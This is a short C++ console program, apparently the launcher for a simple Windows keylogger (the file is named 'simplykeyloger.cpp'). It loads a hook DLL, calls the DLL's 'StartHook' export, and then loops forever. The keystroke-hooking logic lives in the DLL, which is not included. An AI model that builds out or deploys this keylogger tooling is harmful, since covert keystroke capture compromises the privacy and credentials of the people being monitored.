// simplykeyloger.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <iostream>


typedef BOOL(*Func)();
int _tmain(int argc, _TCHAR* argv[])
{
	unsigned long dwError = NOERROR;
	BOOL bRet = FALSE;
	HINSTANCE hDLL = nullptr;
	do 	{

		hDLL = LoadLibraryW(L"SetWindowsHookDll1.dll");
		if (!hDLL)
		{
			dwError = GetLastError();
			break;
		}
		Func fun = (Func)GetProcAddress(hDLL, "StartHook");
		if (!fun)
		{
			dwError = GetLastError();
			break;
		}
		if (!fun())
		{
			break;
		}
		///////////////////////////////////////////////////
		bRet = TRUE;
	} while (FALSE);
	while (true)
	{
		//char szInput[MAXBYTE] = { 0 };
		//std::cin >> szInput;
	}

	if (bRet == FALSE)
	{
		std::cout << "出现错误" << dwError << std::endl;
	}

	if (hDLL)
	{
		FreeLibrary(hDLL);
	}
	
	system("pause");


	return 0;
}

